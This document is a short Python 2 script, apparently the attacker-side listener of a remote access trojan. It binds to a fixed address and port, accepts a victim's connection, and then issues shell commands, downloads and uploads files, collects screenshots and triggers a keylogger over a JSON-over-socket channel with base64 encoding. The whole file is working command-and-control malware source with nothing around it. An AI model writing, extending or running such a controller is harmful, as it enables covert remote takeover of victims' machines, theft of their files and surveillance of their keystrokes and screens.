#!/usr/bin/python

import socket
import os
import subprocess
import json
import base64

def reliable_send(data):
    json_data = json.dumps(data)
    target.send(json_data)

def reliable_recv():
    data = ""
    while True:
        try:
            data = data + target.recv(1024)
            return json.loads(data)
        except ValueError:
            continue

def shell():
    global count
    while True:
        command = raw_input("Shell#~%s: " % str(ip))
        reliable_send(command)
        if command == 'q':
            break
        elif command[:2] == "cd":
            continue
        elif command[:8] == "download":
            with open(command[9:], "wb") as file:
                file_data = reliable_recv()
                file.write(base64.b64decode(file_data))
        elif command[:6] == "upload":
            try:
                with open(command[7:], "rb") as fin:
                    reliable_send(base64.b64encode(fin.read()))
            except:
                failed = "Failed to uplaod file\n"
                reliable_send(base64.b64encode(failed))

        elif command[:10] == "screenshot":
            with open("screenshot%d" % count, "wb") as sc:
                image = reliable_recv()
                image_decoded = base64.b64decode(image)
                if image_decoded[:3] == "[-]":
                    print(image_decoded)
                else:
                    sc.write(image_decoded)
                    count += 1

        elif command[:12] == "keylog_start":
            continue
        else:
            result = reliable_recv()
            print(result)

def server():
    global s
    global ip
    global target
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("10.0.0.74", 54321))
    s.listen(5)
    print("[+] Listening for incoming connenctions")
    target, ip = s.accept()

count = 1
server()
shell()
s.close()
